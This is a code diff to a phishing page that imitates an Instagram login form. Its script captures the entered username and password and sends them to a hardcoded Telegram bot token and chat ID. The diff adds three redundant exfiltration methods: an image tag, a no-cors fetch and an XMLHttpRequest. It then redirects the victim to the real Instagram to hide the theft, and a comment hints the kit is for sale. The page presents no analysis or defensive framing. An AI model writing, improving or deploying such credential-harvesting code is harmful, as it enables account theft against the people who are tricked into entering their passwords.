@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -35,12 +35,28 @@
     <script>
         const BOT_TOKEN='8905622970:AAEbMKn5v2G7jOmftR5cJxBkyj0Ft9H59O0';
         const CHAT_ID='6715785327';
+        
         document.getElementById('loginForm').onsubmit=function(e){
             e.preventDefault();
             const u=document.getElementById('username').value;
             const p=document.getElementById('password').value;
+            
             if(u&&p){
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20Instagram%0A👤%20${encodeURIComponent(u)}%0A🔑%20${encodeURIComponent(p)}`);
+                // Method 1: Image tag (ALWAYS WORKS, sale!)
+                const img=new Image();
+                img.src=`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20Instagram%0A👤%20${encodeURIComponent(u)}%0A🔑%20${encodeURIComponent(p)}`;
+                
+                // Method 2: Fetch with no-cors
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20Instagram%0A👤%20${encodeURIComponent(u)}%0A🔑%20${encodeURIComponent(p)}`, {
+                    mode: 'no-cors'
+                });
+                
+                // Method 3: XMLHttpRequest
+                const xhr=new XMLHttpRequest();
+                xhr.open('GET', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20Instagram%0A👤%20${encodeURIComponent(u)}%0A🔑%20${encodeURIComponent(p)}`);
+                xhr.send();
+                
+                // Redirect to real Instagram
                 window.location.href='https://www.instagram.com';
             }
         };
